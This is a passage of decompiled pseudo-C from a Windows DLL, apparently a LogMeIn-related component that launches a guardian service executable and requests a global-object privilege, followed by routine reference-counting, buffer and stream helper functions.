                  FUN_10006f30();
                  if (iVar4 == 0) {
                    iVar4 = 0;
                  }
                  else {
                    iVar4 = iVar4 + 0xc;
                  }
                  uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                  uVar26 = 1;
                  pwVar21 = L"lpldap.dbg";
                  uVar24 = FUN_1000adf0(L"lpldap.dbg",iVar4,1,uVar6);
                  FUN_10035c00(uVar24,pwVar21,iVar4,uVar26,uVar6);
                  FUN_10008e20();
                  FUN_10006f30();
                  FUN_10006f30();
                  FUN_10006f30();
                }
                FUN_10006f30();
              }
              FUN_1003a170();
switchD_10025333_caseD_6:
              FUN_10006f30();
              piVar3 = (int *)puVar15[-0x12d];
              if (piVar3 != (int *)0x0) {
                LOCK();
                iVar4 = *piVar3;
                *piVar3 = iVar4 + -1;
                UNLOCK();
                if (iVar4 + -1 < 0) {
                  FUN_100579ee(piVar3);
                }
              }
              *(undefined1 *)(puVar15 + -1) = 0x1d;
              FUN_1002eb00();
              uVar6 = puVar15[-0x7b] + 1;
              puVar15[-0x7b] = uVar6;
            } while (uVar6 < (uint)puVar15[-0x89]);
          }
          FUN_10026d80();
          if (puVar15[-0x8b] == 0) goto LAB_10025f14;
        }
        iVar4 = FUN_10023ae0(*(undefined4 *)(puVar15[-0xbf] + 0x20));
        if (iVar4 == 0) {
          FUN_1000ad00(L"wait for dumpwriter execution",0xffffffff);
          *(undefined1 *)(puVar15 + -1) = 0x5c;
          FUN_1002de70(L"SeCreateGlobalPrivilege",0);
          *(undefined1 *)(puVar15 + -1) = 0x5d;
          FUN_10023720(puVar15[-0xc]);
          uVar24 = FUN_1000adf0();
          FUN_10033240(uVar24);
          FUN_1001a3b0();
          FUN_1002dfc0();
          FUN_10006f30();
        }
        FUN_10008e20();
        FUN_100236e0();
        FUN_10006f30();
        FUN_1000ab80();
        FUN_10006f30();
        FUN_10026990();
        FUN_10033210();
      }
      else {
        iVar4 = 0;
        puVar15[-0x8d] = 0;
        *(undefined1 *)(puVar15 + -1) = 10;
        FUN_10022a60(puVar15[-0x8c]);
        piVar3 = *(int **)puVar15[-0xe9];
        if (piVar3 != (int *)puVar15[-0xe9]) {
LAB_10026403:
          FUN_1000ace0(piVar3 + 2);
          FUN_10027850();
          puVar15[-0x8e] = 0;
          do {
            FUN_10019e10(puVar15 + -0xd0);
            *(undefined1 *)(puVar15 + -1) = 0xd;
            FUN_1000ae10(puVar15 + -0xca);
            *(undefined1 *)(puVar15 + -1) = 0xe;
            uVar2 = FUN_10026a90(*(undefined4 *)
                                  ((int)&PTR_s_avutil_51_dll_10084d70 + puVar15[-0x8e]));
            *(undefined1 *)((int)puVar15 + -0x1e5) = uVar2;
            FUN_10006f30();
            FUN_10006f30();
            if (*(char *)((int)puVar15 + -0x1e5) != '\0') {
              uVar6 = 0;
              puVar15[-0x97] = 0;
              goto LAB_100264b3;
            }
            iVar10 = puVar15[-0x8e];
            puVar15[-0x8e] = iVar10 + 4U;
          } while (iVar10 + 4U < 0x244);
          goto LAB_1002655a;
        }
LAB_10026573:
        iVar10 = 0;
        puVar15[-0xa2] = 0;
        *(undefined1 *)(puVar15 + -1) = 0x10;
        uVar24 = FUN_10021a40(0,1);
        FUN_1000ace0(uVar24);
        FUN_10006f30();
        piVar3 = (int *)puVar15[-0xab];
        puVar15[-0x7b] = piVar3;
        if (piVar3 != (int *)0x0) {
          LOCK();
          *piVar3 = *piVar3 + 1;
          UNLOCK();
        }
        FUN_1000c820(0);
        puVar12 = puVar15 + -0xb6;
        uVar24 = 0x100265dc;
        FUN_10019e10(puVar12);
        *(undefined1 *)(puVar15 + -1) = 0x13;
        uVar2 = FUN_100269f0(uVar24,puVar12);
        *(undefined1 *)((int)puVar15 + -0x1e5) = uVar2;
        *(undefined1 *)(puVar15 + -1) = 0x12;
        FUN_10006f30();
        if (*(char *)((int)puVar15 + -0x1e5) != '\0') {
          FUN_1000c820(1);
          uVar24 = FUN_1000bfa0(L"x86\\LMIGuardianSvc.exe",0xffffffff);
          puVar15[-0x7b] = uVar24;
          FUN_100213b0(puVar15 + -0x7b);
          if ((puVar15[-0x25] != 0) || (puVar15[-0x24] != 0)) {
            if (puVar15[-0x7b] == 0) {
              iVar10 = 0;
            }
            else {
              iVar10 = puVar15[-0x7b] + 0xc;
            }
            iVar10 = FUN_1000bdd0(iVar10,extraout_ECX_19);
            puVar15[-0xa2] = iVar10;
          }
        }
        if (iVar4 == 0) {
          iVar4 = 0;
        }
        else {
          iVar4 = iVar4 + 0xc;
        }
        FUN_1002e7a0(iVar4);
        if (iVar10 == 0) {
          iVar10 = 0;
        }
        else {
          iVar10 = iVar10 + 0xc;
        }
        FUN_1002e7a0(iVar10);
        FUN_1000ad00(&DAT_10084020,0xffffffff);
        *(undefined1 *)(puVar15 + -1) = 0x14;
        iVar4 = FUN_1002ea20(puVar15 + -0x1c9);
        puVar12 = puVar15 + -0xa2;
        if (iVar4 == 0) {
          puVar12 = puVar15 + -0x8d;
        }
        FUN_1000ad40(puVar12);
        iVar4 = FUN_1000bfa0(&DAT_10084020,0xffffffff);
        puVar15[-0x83] = iVar4;
        if ((iVar4 != 0) && (*(int *)(iVar4 + 8) != 0)) {
          FUN_1000bfa0(L" /ESCORT ",0xffffffff);
          uVar24 = puVar15[-0x8c];
          uVar27 = 10;
          uVar26 = FUN_100155d0(uVar24,10);
          puVar15[-0x83] = uVar26;
          uVar25 = 0;
          uVar23 = 0;
          uVar26 = extraout_ECX_20;
          uVar8 = FUN_1000adf0(0,extraout_ECX_20,0);
          FUN_10021ec0(uVar8,uVar23,uVar26,uVar25,uVar24,uVar27);
          uVar24 = puVar15[-0x176];
          if (puVar15[-0x171] != 0) {
            uVar24 = 0;
          }
          FUN_10483724(0x400,0,uVar24);
          *(byte *)(unaff_EBX + 0x4b589f0) = *(byte *)(unaff_EBX + 0x4b589f0) | 0xfc;
                    /* WARNING: Bad instruction - Truncating control flow here */
          halt_baddata();
        }
        FUN_10006f30();
        FUN_10006f30();
        FUN_10006f30();
        FUN_10006f30();
        *(undefined1 *)(puVar15 + -1) = 10;
        FUN_10022c10();
        FUN_10006f30();
        if (puVar15[-0x9a] != 0) {
          (*DAT_10079270)(puVar15[-0x9a]);
          puVar15[-0x9a] = 0;
        }
        piVar3 = (int *)puVar15[-0x9b];
        if (piVar3 != (int *)0x0) {
          LOCK();
          iVar4 = *piVar3;
          *piVar3 = *piVar3 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(piVar3);
          }
        }
      }
      *(undefined1 *)(puVar15 + -1) = 5;
      FUN_10027790();
      FUN_10006f30();
      FUN_10006f30();
      FUN_10006f30();
      FUN_10006f30();
      FUN_10006f30();
      goto LAB_100263b7;
    }
    *(undefined4 *)(iVar10 + 4) = 5;
  }
  else {
    *(undefined4 *)(iVar10 + 4) = 4;
  }
  if (puVar15[-0x9a] != 0) {
    (*DAT_10079270)(puVar15[-0x9a]);
    puVar15[-0x9a] = 0;
  }
  piVar9 = (int *)puVar15[-0x9b];
  if (piVar9 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar9;
    *piVar9 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar9);
    }
  }
  *(undefined1 *)(puVar15 + -1) = 5;
  FUN_10027790();
  piVar9 = (int *)puVar15[-0x91];
  if (piVar9 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar9;
    *piVar9 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar9);
    }
  }
  piVar9 = (int *)puVar15[-0xac];
  if (piVar9 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar9;
    *piVar9 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar9);
    }
  }
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar5;
    *piVar5 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  piVar5 = (int *)puVar15[-0xb0];
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar5;
    *piVar5 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  LOCK();
  iVar4 = *piVar3;
  *piVar3 = *piVar3 + -1;
  UNLOCK();
  if (iVar4 + -1 < 0) {
    FUN_100579ee(piVar3);
  }
LAB_100263b7:
  ExceptionList = (void *)puVar15[-3];
  FUN_100579df();
  return;
  while( true ) {
    FUN_10006f30();
    uVar6 = puVar15[-0x97] + 1;
    puVar15[-0x97] = uVar6;
    if (1 < uVar6) break;
LAB_100264b3:
    FUN_1000ace0(piVar3 + 2);
    *(undefined1 *)(puVar15 + -1) = 0xf;
    FUN_1000c820(1);
    iVar4 = FUN_1000bfa0(puVar15[uVar6 - 0xc6],0xffffffff);
    puVar15[-0x94] = iVar4;
    FUN_100213b0(puVar15 + -0x94);
    if ((puVar15[-0x19] != 0) || (puVar15[-0x18] != 0)) {
      if (iVar4 == 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = iVar4 + 0xc;
      }
      iVar4 = FUN_1000bdd0(iVar4,extraout_ECX_18);
      puVar15[-0x8d] = iVar4;
      FUN_10006f30();
      goto LAB_1002655a;
    }
  }
  iVar4 = puVar15[-0x8d];
LAB_1002655a:
  FUN_10006f30();
  piVar3 = (int *)*piVar3;
  if (piVar3 == (int *)puVar15[-0xe9]) goto LAB_10026573;
  goto LAB_10026403;
}



/* Function: FUN_10026990 */

void __fastcall FUN_10026990(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = (int *)param_1[1];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_100269d0 */

void __fastcall FUN_100269d0(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = *(int **)(param_1 + 4);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_100269f0 */

void __fastcall FUN_100269f0(int *param_1)

{
  int iVar1;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
    FUN_1004ac10(*(undefined4 *)(iVar1 + 8),iVar1 + 0xc);
    return;
  }
  FUN_1004ac10(0,0);
  return;
}



/* Function: FUN_10026a20 */

char * __thiscall FUN_10026a20(undefined4 *param_1,undefined4 *param_2)

{
  char *pcVar1;
  int iVar2;
  int *piVar3;
  char *pcVar4;
  
  pcVar4 = (char *)*param_2;
  if ((pcVar4 != (char *)0x0) && (*(int *)(pcVar4 + 8) != 0)) {
    pcVar1 = pcVar4 + 8;
    pcVar4 = pcVar4 + 0xc;
    if ((pcVar4 != (char *)0x0) && (*pcVar4 != '\0')) {
      pcVar4 = (char *)FUN_1000c0a0(pcVar4,*(undefined4 *)pcVar1);
      *param_1 = pcVar4;
      return pcVar4;
    }
  }
  piVar3 = (int *)*param_1;
  if (piVar3 != (int *)0x0) {
    if (*piVar3 == 0) {
      piVar3[2] = 0;
      *(undefined2 *)(piVar3 + 3) = 0;
      *param_1 = piVar3;
      return (char *)0x0;
    }
    LOCK();
    iVar2 = *piVar3;
    pcVar4 = (char *)*piVar3;
    *piVar3 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      pcVar4 = (char *)FUN_100579ee(piVar3);
    }
  }
  *param_1 = 0;
  return pcVar4;
}



/* Function: FUN_10026a90 */

uint __thiscall FUN_10026a90(int *param_1,char *param_2)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  
  if (param_2 == (char *)0x0) {
    iVar6 = 0;
  }
  else {
    pcVar5 = param_2;
    do {
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar1 != '\0');
    iVar6 = (int)pcVar5 - (int)(param_2 + 1);
  }
  iVar2 = *param_1;
  if (iVar2 == 0) {
    iVar4 = 0;
    uVar3 = 0;
  }
  else {
    iVar4 = *(int *)(iVar2 + 8);
    uVar3 = iVar2 + 0xc;
  }
  if ((iVar4 == iVar6) && (uVar3 = FUN_1004a6e0(param_2,iVar4), uVar3 == 0)) {
    return 1;
  }
  return uVar3 & 0xffffff00;
}



/* Function: FUN_10026af0 */

undefined4 FUN_10026af0(void)

{
  return 0xffff;
}



/* Function: FUN_10026b00 */

undefined4 FUN_10026b00(void)

{
  return 0xffff;
}



/* Function: FUN_10026b10 */

undefined2 __fastcall FUN_10026b10(int *param_1)

{
  undefined2 *puVar1;
  short sVar2;
  
  sVar2 = (**(code **)(*param_1 + 0x18))();
  if (sVar2 == -1) {
    return 0xffff;
  }
  *(int *)param_1[0xb] = *(int *)param_1[0xb] + -1;
  puVar1 = *(undefined2 **)param_1[7];
  *(undefined2 **)param_1[7] = puVar1 + 1;
  return *puVar1;
}



/* Function: FUN_10026b40 */

/* WARNING: Removing unreachable block (ram,0x10026b98) */
/* WARNING: Removing unreachable block (ram,0x10026ba2) */

longlong __thiscall FUN_10026b40(int *param_1,short *param_2,uint param_3,int param_4)

{
  longlong lVar1;
  short sVar2;
  uint uVar3;
  bool bVar4;
  longlong lVar5;
  
  if ((-1 < param_4) && ((0 < param_4 || (param_3 != 0)))) {
    lVar1 = 0;
    while( true ) {
      do {
        lVar5 = FUN_1000b710();
        if (lVar5 < 1) {
          sVar2 = (**(code **)(*param_1 + 0x1c))();
          if (sVar2 == -1) {
            return lVar1;
          }
          *param_2 = sVar2;
          param_2 = param_2 + 1;
          lVar1 = lVar1 + 1;
          bVar4 = param_3 != 0;
          param_3 = param_3 - 1;
          param_4 = param_4 + -1 + (uint)bVar4;
        }
        else {
          if (CONCAT44(param_4,param_3) < lVar5) {
            lVar5 = CONCAT44(param_4,param_3);
          }
          uVar3 = (uint)lVar5;
          if (uVar3 != 0) {
            FUN_1005d740(param_2,*(undefined4 *)param_1[7],uVar3 * 2);
          }
          param_2 = param_2 + uVar3;
          lVar1 = lVar5 + lVar1;
          bVar4 = param_3 < uVar3;
          param_3 = param_3 - uVar3;
          param_4 = (param_4 - (int)((ulonglong)lVar5 >> 0x20)) - (uint)bVar4;
          *(int *)param_1[0xb] = *(int *)param_1[0xb] - uVar3;
          *(int *)param_1[7] = *(int *)param_1[7] + uVar3 * 2;
        }
      } while (0 < param_4);
      if (param_4 < 0) break;
      if (param_3 == 0) {
        return lVar1;
      }
    }
    return lVar1;
  }
  return 0;
}



/* Function: FUN_10026c60 */

/* WARNING: Removing unreachable block (ram,0x10026cb8) */
/* WARNING: Removing unreachable block (ram,0x10026cc2) */

longlong __thiscall FUN_10026c60(int *param_1,undefined2 *param_2,uint param_3,int param_4)

{
  longlong lVar1;
  short sVar2;
  uint uVar3;
  bool bVar4;
  longlong lVar5;
  
  if ((-1 < param_4) && ((0 < param_4 || (param_3 != 0)))) {
    lVar1 = 0;
    while( true ) {
      do {
        lVar5 = FUN_1000b730();
        if (lVar5 < 1) {
          sVar2 = (**(code **)(*param_1 + 0xc))(*param_2);
          if (sVar2 == -1) {
            return lVar1;
          }
          param_2 = param_2 + 1;
          lVar1 = lVar1 + 1;
          bVar4 = param_3 != 0;
          param_3 = param_3 - 1;
          param_4 = param_4 + -1 + (uint)bVar4;
        }
        else {
          if (CONCAT44(param_4,param_3) < lVar5) {
            lVar5 = CONCAT44(param_4,param_3);
          }
          uVar3 = (uint)lVar5;
          if (uVar3 != 0) {
            FUN_1005d740(*(undefined4 *)param_1[8],param_2,uVar3 * 2);
          }
          param_2 = param_2 + uVar3;
          lVar1 = lVar5 + lVar1;
          bVar4 = param_3 < uVar3;
          param_3 = param_3 - uVar3;
          param_4 = (param_4 - (int)((ulonglong)lVar5 >> 0x20)) - (uint)bVar4;
          *(int *)param_1[0xc] = *(int *)param_1[0xc] - uVar3;
          *(int *)param_1[8] = *(int *)param_1[8] + uVar3 * 2;
        }
      } while (0 < param_4);
      if (param_4 < 0) break;
      if (param_3 == 0) {
        return lVar1;
      }
    }
    return lVar1;
  }
  return 0;
}



/* Function: FUN_10026d80 */

void __fastcall FUN_10026d80(uint *param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  
  uVar1 = *param_1;
  if (uVar1 != 0) {
    uVar3 = param_1[1] + uVar1;
    uVar2 = param_1[1] + uVar1;
    if (((uVar1 < uVar2) && (uVar1 < uVar3)) && (uVar3 <= uVar2)) {
      if (uVar3 != uVar1) {
        FUN_10027070(uVar3,uVar2 - uVar3);
      }
      param_1[1] = param_1[1] + (uVar1 - uVar3);
    }
    if (*param_1 != 0) {
      FUN_100579ee(*param_1);
    }
  }
  return;
}



/* Function: FUN_10026dd0 */

void __thiscall FUN_10026dd0(int *param_1,undefined1 *param_2)

{
  if ((uint)param_1[2] <= (uint)param_1[1]) {
    FUN_10026e00(param_1[1] + 1);
  }
  if ((undefined1 *)(param_1[1] + *param_1) != (undefined1 *)0x0) {
    *(undefined1 *)(param_1[1] + *param_1) = *param_2;
  }
  param_1[1] = param_1[1] + 1;
  return;
}



/* Function: FUN_10026e00 */

void __thiscall FUN_10026e00(int *param_1,uint param_2)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  
  uVar2 = param_1[2];
  if (uVar2 < param_2) {
    if (*param_1 == 0) {
      uVar2 = 0x10;
      if (0x10 < param_2 + 1) {
        uVar2 = param_2 + 1;
      }
      uVar3 = uVar2 + 0xf & 0xfffffff0;
    }
    else if (param_2 < 0x10000) {
      if (uVar2 < 0x8000) {
        uVar3 = 0x10;
        if (0xf < uVar2) {
          uVar3 = uVar2;
        }
        do {
          uVar3 = uVar3 * 2;
        } while (uVar3 < param_2);
      }
      else {
        uVar3 = 0x10000;
      }
    }
    else {
      uVar3 = param_2 + 0xffff & 0xffff0000;
    }
    iVar1 = FUN_100581b4(uVar3);
    if (iVar1 != 0) {
      uVar2 = 0;
      param_1[2] = uVar3;
      if (param_1[1] != 0) {
        do {
          if (*param_1 == 0) break;
          if ((undefined1 *)(uVar2 + iVar1) != (undefined1 *)0x0) {
            *(undefined1 *)(uVar2 + iVar1) = *(undefined1 *)(*param_1 + uVar2);
          }
          uVar2 = uVar2 + 1;
        } while (uVar2 < (uint)param_1[1]);
      }
      FUN_100579ee(*param_1);
      *param_1 = iVar1;
    }
  }
  return;
}



/* Function: FUN_10026eb0 */

undefined4 * __thiscall FUN_10026eb0(undefined4 *param_1,byte param_2)

{
  int *piVar1;
  undefined4 *puVar2;
  
  piVar1 = (int *)param_1[0xd];
  *param_1 = vftable;
  if (piVar1 != (int *)0x0) {
    if ((int *)*piVar1 != (int *)0x0) {
      puVar2 = (undefined4 *)(**(code **)(*(int *)*piVar1 + 8))();
      if (puVar2 != (undefined4 *)0x0) {
        (**(code **)*puVar2)(1);
      }
    }
    thunk_FUN_100579ee(piVar1);
  }
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10026f00 */

void __fastcall FUN_10026f00(int param_1)

{
  int iVar1;
  
  *(undefined ***)(*(int *)(*(int *)(param_1 + -8) + 4) + -8 + param_1) =
       std::basic_ostream<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  iVar1 = *(int *)(*(int *)(param_1 + -8) + 4);
  *(int *)(iVar1 + -0xc + param_1) = iVar1 + -8;
  return;
}



/* Function: FUN_10026f20 */

int * __fastcall FUN_10026f20(int *param_1)

{
  int *piVar1;
  char cVar2;
  int iVar3;
  uint uVar4;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0xffffffff;
  puStack_10 = &LAB_10075e90;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 4))(DAT_100956e0 ^ (uint)&stack0xffffffd8);
    uStack_c = 0;
    if (((*(int *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) == 0) &&
        (piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x3c + (int)param_1), piVar1 != (int *)0x0)) &&
       (piVar1 != param_1)) {
      FUN_10026f20();
    }
    uStack_c = 1;
    if ((*(int *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) == 0) &&
       (iVar3 = (**(code **)(**(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1) + 0x34))(),
       iVar3 == -1)) {
      iVar3 = *(int *)(*param_1 + 4);
      uVar4 = *(uint *)(iVar3 + 0xc + (int)param_1) & 0x17 | 4;
      *(uint *)((int)param_1 + iVar3 + 0xc) = uVar4;
      if ((*(uint *)((int)param_1 + iVar3 + 0x10) & uVar4) != 0) {
        FUN_10008c40();
      }
    }
    uStack_c = 0xffffffff;
    cVar2 = thunk_FUN_1005f653();
    if (cVar2 == '\0') {
      FUN_10027100();
    }
    piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
    if (piVar1 != (int *)0x0) {
      (**(code **)(*piVar1 + 8))();
    }
  }
  ExceptionList = local_14;
  return param_1;
}



/* Function: FUN_10027020 */

ios_base * __thiscall FUN_10027020(ios_base *param_1,byte param_2)

{
  ios_base *piVar1;
  
  piVar1 = param_1 + -8;
  *(undefined ***)(param_1 + *(int *)(*(int *)piVar1 + 4) + -8) =
       std::basic_ostream<wchar_t,struct_std::char_traits<wchar_t>_>::vftable;
  *(int *)(param_1 + *(int *)(*(int *)(param_1 + -8) + 4) + -0xc) =
       *(int *)(*(int *)(param_1 + -8) + 4) + -8;
  *(undefined ***)param_1 = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(piVar1);
  }
  return piVar1;
}



/* Function: FUN_10027070 */

void __thiscall FUN_10027070(undefined1 *param_1,undefined1 *param_2,int param_3)

{
  undefined1 *puVar1;
  int iVar2;
  
  if (param_1 < param_2) {
    if (param_3 != 0) {
      iVar2 = (int)param_2 - (int)param_1;
      do {
        if (param_1 != (undefined1 *)0x0) {
          *param_1 = param_1[iVar2];
        }
        param_1 = param_1 + 1;
        param_3 = param_3 + -1;
      } while (param_3 != 0);
      return;
    }
  }
  else if (param_3 != 0) {
    puVar1 = param_1 + param_3 + -1;
    do {
      if (puVar1 != (undefined1 *)0x0) {
        *puVar1 = puVar1[(int)param_2 - (int)param_1];
      }
      puVar1 = puVar1 + -1;
    } while (puVar1 + (1 - (int)param_1) != (undefined1 *)0x0);
  }
  return;
}



/* Function: FUN_100270d0 */

void __fastcall FUN_100270d0(int *param_1)

{
  int *piVar1;
  char cVar2;
  
  cVar2 = thunk_FUN_1005f653();
  if (cVar2 == '\0') {
    FUN_10027100();
  }
  piVar1 = *(int **)(*(int *)(*(int *)*param_1 + 4) + 0x38 + *param_1);
  if (piVar1 != (int *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x100270f5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



/* Function: FUN_10027100 */

void __fastcall FUN_10027100(int *param_1)

{
  int iVar1;
  uint uVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075eb0;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_8 = 0;
  iVar1 = *(int *)(*param_1 + 4);
  if (((*(int *)(iVar1 + 0xc + (int)param_1) == 0) &&
      ((*(byte *)(iVar1 + 0x14 + (int)param_1) & 2) != 0)) &&
     (iVar1 = (**(code **)(**(int **)(iVar1 + 0x38 + (int)param_1) + 0x34))(), iVar1 == -1)) {
    iVar1 = *(int *)(*param_1 + 4);
    uVar2 = *(uint *)(iVar1 + 0xc + (int)param_1) & 0x17 | 4;
    *(uint *)((int)param_1 + iVar1 + 0xc) = uVar2;
    if ((*(uint *)((int)param_1 + iVar1 + 0x10) & uVar2) != 0) {
      FUN_10008c40();
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: Catch_All@1002718c */

undefined4 Catch_All_1002718c(void)

{
  return 0x1002717a;
}



/* Function: FUN_100271a0 */

void __fastcall FUN_100271a0(int *param_1)

{
  int *piVar1;
  
  piVar1 = *(int **)(*(int *)(*(int *)*param_1 + 4) + 0x38 + *param_1);
  if (piVar1 != (int *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x100271b1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}



/* Function: FUN_100271c0 */

void __fastcall FUN_100271c0(int *param_1)

{
  if ((DAT_10079270 != (code *)0x0) && (*param_1 != 0)) {
    (*DAT_10079270)(*param_1);
  }
  return;
}



/* Function: FUN_100271e0 */

int * FUN_100271e0(int *param_1)

{
  uint uVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  int *piVar5;
  undefined1 local_28 [12];
  _Lockit local_1c [4];
  _Lockit local_18 [4];
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074558;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  std::_Lockit::_Lockit(local_1c,0);
  piVar2 = DAT_1009ad1c;
  local_8 = 0;
  local_14 = DAT_1009ad1c;
  if (DAT_100980ac == 0) {
    std::_Lockit::_Lockit(local_18,0);
    if (DAT_100980ac == 0) {
      DAT_10098090 = DAT_10098090 + 1;
      DAT_100980ac = DAT_10098090;
    }
    std::_Lockit::~_Lockit(local_18);
  }
  uVar1 = DAT_100980ac;
  iVar4 = *param_1;
  if (DAT_100980ac < *(uint *)(iVar4 + 0xc)) {
    piVar5 = *(int **)(*(int *)(iVar4 + 8) + DAT_100980ac * 4);
    if (piVar5 != (int *)0x0) goto LAB_100272dd;
  }
  else {
    piVar5 = (int *)0x0;
  }
  if (*(char *)(iVar4 + 0x14) == '\0') {
LAB_10027289:
    if (piVar5 != (int *)0x0) goto LAB_100272dd;
  }
  else {
    iVar4 = FUN_10056caf(uVar3);
    if (uVar1 < *(uint *)(iVar4 + 0xc)) {
      piVar5 = *(int **)(*(int *)(iVar4 + 8) + uVar1 * 4);
      goto LAB_10027289;
    }
  }
  piVar5 = piVar2;
  if (piVar2 == (int *)0x0) {
    iVar4 = FUN_10024160(&local_14,param_1);
    if (iVar4 == -1) {
      FUN_1005851c("bad cast");
      FUN_1005de1b(local_28,&DAT_10092fd0);
    }
    piVar5 = local_14;
    DAT_1009ad1c = local_14;
    (**(code **)(*local_14 + 4))();
    Facet_Register(piVar5);
  }
LAB_100272dd:
  std::_Lockit::~_Lockit(local_1c);
  ExceptionList = local_10;
  return piVar5;
}



/* Function: FUN_10027300 */

/* WARNING: Instruction at (ram,0x1002775e) overlaps instruction at (ram,0x1002775a)
    */

void __thiscall FUN_10027300(int *param_1,short *param_2)

{
  uint *puVar1;
  int iVar2;
  char cVar3;
  int iVar4;
  int *piVar5;
  code *pcVar6;
  undefined4 extraout_ECX;
  int *extraout_ECX_00;
  undefined **ppuVar7;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int *extraout_ECX_03;
  int *extraout_ECX_04;
  int extraout_EDX;
  int unaff_EBX;
  undefined4 uVar8;
  int in_stack_00000018;
  undefined4 in_stack_ffffc20c;
  undefined4 in_stack_ffffc210;
  int *local_80;
  int *local_74;
  int *local_70;
  int *local_6c;
  int *local_68;
  int *local_64;
  int *local_60 [2];
  undefined1 *local_58;
  undefined1 local_50 [20];
  int *local_3c;
  undefined1 local_34 [16];
  int local_24;
  int local_1c;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075efb;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  uVar8 = 0;
  *param_1 = in_stack_00000018;
  param_1[1] = 0;
  param_1[2] = 4;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    iVar4 = FUN_1000bd10(local_14);
  }
  else {
    iVar4 = FUN_1000ba60();
  }
  param_1[3] = iVar4;
  local_8 = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  FUN_1002de70(L"SeCreateGlobalPrivilege",0);
  local_8 = CONCAT31(local_8._1_3_,1);
  cVar3 = FUN_10023720(1);
  if (cVar3 == '\0') {
    piVar5 = (int *)param_1[3];
    uVar8 = 1;
    if (piVar5 == (int *)0x0) {
LAB_100273d4:
      piVar5 = (int *)0x0;
    }
    else {
      if (*piVar5 != 0) {
        LOCK();
        iVar4 = *piVar5;
        *piVar5 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(piVar5);
        }
        goto LAB_100273d4;
      }
      piVar5[2] = 0;
      *(undefined2 *)(piVar5 + 3) = 0;
    }
    param_1[3] = (int)piVar5;
  }
  FUN_1002e2e0(1,0,uVar8);
  local_8._0_1_ = 2;
  if (((param_1[3] != 0) && (*(int *)(param_1[3] + 8) != 0)) &&
